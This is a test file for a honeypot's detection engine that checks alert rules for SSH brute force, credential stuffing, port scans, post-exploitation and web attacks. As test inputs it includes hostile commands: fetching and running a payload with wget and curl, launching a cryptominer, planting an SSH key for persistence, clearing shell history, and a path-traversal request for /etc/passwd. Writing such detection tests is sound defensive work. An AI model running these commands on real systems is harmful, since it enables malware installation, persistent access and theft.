from hivewatch.detection import DetectionEngine
from hivewatch.models import Event


def ev(**kw) -> Event:
    kw.setdefault("sensor", "ssh")
    kw.setdefault("dst_port", 22)
    kw.setdefault("src_ip", "45.1.1.1")
    return Event(**kw)


def run(engine: DetectionEngine, events: list[Event]) -> list[str]:
    rules: list[str] = []
    for e in events:
        rules += [a.rule for a in engine.process(e)]
    return rules


def test_brute_force_fires_once_per_cooldown():
    e = DetectionEngine()
    events = [ev(event_type="login_failed", username="root", password=f"p{i}", ts=1000 + i) for i in range(25)]
    rules = run(e, events)
    assert rules.count("brute_force") == 1


def test_slow_guessing_is_not_brute_force():
    e = DetectionEngine()
    events = [ev(event_type="login_failed", username="root", password="x", ts=1000 + i * 30) for i in range(10)]
    assert "brute_force" not in run(e, events)


def test_username_enumeration():
    e = DetectionEngine()
    users = ["root", "admin", "oracle", "pi", "test", "git"]
    events = [ev(event_type="login_failed", username=u, password="x", ts=1000 + i * 20) for i, u in enumerate(users)]
    assert "username_enumeration" in run(e, events)


def test_distributed_credential_stuffing_across_ips():
    e = DetectionEngine()
    events = [
        ev(sensor="telnet", dst_port=23, event_type="login_failed", username="root", password="xc3511",
           src_ip=f"77.0.0.{i}", ts=1000 + i)
        for i in range(5)
    ]
    rules = run(e, events)
    assert rules.count("distributed_stuffing") == 1


def test_port_scan():
    e = DetectionEngine()
    events = [ev(sensor="tcp", event_type="port_probe", dst_port=p, ts=1000 + i)
              for i, p in enumerate([22, 23, 80, 3389, 5900])]
    assert "port_scan" in run(e, events)


def test_post_exploitation_rules():
    e = DetectionEngine()
    events = [
        ev(event_type="login_success", username="root", password="123456", session_id="s1", ts=1),
        ev(event_type="command", command="wget http://203.0.113.9/bins/x86", session_id="s1", ts=2),
        ev(event_type="command", command="./xmrig -o stratum+tcp://pool:3333", session_id="s1", ts=3),
        ev(event_type="command", command="echo key >> ~/.ssh/authorized_keys", session_id="s1", ts=4),
        ev(event_type="command", command="history -c", session_id="s1", ts=5),
    ]
    rules = run(e, events)
    assert {"honeypot_login", "malware_download", "cryptominer", "persistence", "anti_forensics"} <= set(rules)


def test_malware_download_extracts_url_ioc():
    e = DetectionEngine()
    alerts = e.process(ev(event_type="command", command="curl -O http://198.51.100.7/payload.sh; sh payload.sh"))
    dl = next(a for a in alerts if a.rule == "malware_download")
    assert dl.severity == "critical"
    assert dl.evidence["urls"] == ["http://198.51.100.7/payload.sh"]


def test_web_exploit():
    e = DetectionEngine()
    alerts = e.process(ev(sensor="http", dst_port=80, event_type="http_request", http_method="GET",
                          path="/../../../../etc/passwd"))
    assert [a.rule for a in alerts] == ["web_exploit"]
